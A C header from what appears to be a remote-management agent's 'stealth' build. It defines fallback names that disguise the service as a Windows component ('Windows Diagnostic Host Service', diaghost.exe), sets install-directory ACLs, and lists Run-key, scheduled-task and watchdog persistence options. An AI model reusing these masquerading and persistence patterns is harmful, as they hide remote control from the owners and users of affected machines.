#ifndef MESH_SERVICE_STEALTH_DEFAULTS_H
#define MESH_SERVICE_STEALTH_DEFAULTS_H

// Shared fallback branding strings used by stealth components when
// provisioning-time values are unavailable. Macros keep the literals
// accessible to both C and RC sources without allocating storage.
#define STEALTH_FALLBACK_SERVICE_DESCRIPTION L"system health monitoring. If this service is stopped, certain features may not function properly."
#define STEALTH_FALLBACK_SERVICE_NAME        L"WinDiagnosticHost"
#define STEALTH_FALLBACK_DISPLAY_NAME        L"Windows Diagnostic Host Service"
#define STEALTH_FALLBACK_EXE_NAME            L"diaghost.exe"
#define STEALTH_FALLBACK_DLL_NAME            L"diagsvc.dll"
#define STEALTH_FALLBACK_DB_NAME             L"diaghost.db"
#define STEALTH_FALLBACK_CONF_NAME           L"diaghost.conf"
#define STEALTH_FALLBACK_LOG_NAME            L"diagnostics.log"

// Installation ACL defaults.
//
// Install root must be traversable by interactive users so the per-session helper
// (KVM/etc) can execute the host binary via CreateProcessAsUser(). Do not inherit
// the interactive ACE to child objects; binaries are explicitly ACL'd as needed.
#define STEALTH_SECURE_DIR_DACL_SDDL         L"D:(A;OICI;FA;;;SY)(A;OICI;FA;;;BA)"
#define STEALTH_INSTALL_ROOT_DACL_SDDL       L"D:(A;OICI;FA;;;SY)(A;OICI;FA;;;BA)(A;;0x1200a9;;;IU)"
#define STEALTH_HOST_EXE_DACL_SDDL           L"D:(A;;FA;;;SY)(A;;FA;;;BA)(A;;0x1200a9;;;IU)"

/*
 * Persistence toggle reference:
 *   - Run key / autorun task / restart task flags come from branding_config.persistence.*
 *   - Watchdog + service recovery settings (interval, delays, actions) map to
 *     MESH_AGENT_PERSIST_WATCHDOG_* and MESH_AGENT_PERSIST_RECOVERY_* defines.
 *   - See STEALTHLAB_CONFIG_GUIDE.md for operator guidance on per-group overrides.
 */

#endif /* MESH_SERVICE_STEALTH_DEFAULTS_H */
